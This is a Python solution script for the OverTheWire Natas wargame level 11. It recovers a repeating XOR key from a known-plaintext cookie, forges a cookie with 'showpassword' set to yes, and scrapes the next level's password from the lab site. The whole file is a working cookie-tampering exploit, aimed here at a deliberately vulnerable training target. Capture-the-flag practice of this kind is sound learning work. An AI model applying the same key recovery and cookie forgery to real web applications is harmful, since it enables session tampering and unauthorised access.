from requests import get
from sys import argv

from base64 import b64decode, b64encode

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"natas{int(next_level[5:]) - 1}"

URL = f"http://{username.split('.')[0]}.natas.labs.overthewire.org"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

defaultdata = '{"showpassword":"no","bgcolor":"#ffffff"}'.encode()
og_cookie = 'MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY='

og_decoded = b64decode(og_cookie)

key = b''.join([(i ^ j).to_bytes(1) for i,j in zip(defaultdata, og_decoded)])
key = key[:4]

desireddata = '{"showpassword":"yes","bgcolor":"#ffffff"}'.encode()

data_decoded = b''
for i in range(len(desireddata)):
    j = key[i % 4]
    data_decoded += (desireddata[i] ^ j).to_bytes(1)

new_cookie = b64encode(data_decoded).decode()

resp = get(URL, auth=(username, password), cookies={'data' : new_cookie})

lines = resp.text.split('\n')

# Password in page
for line in lines:
    if "natas12" in line:
        new_password = line.split(' ')[5].replace('<br>', '')
        break

print(new_password)

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
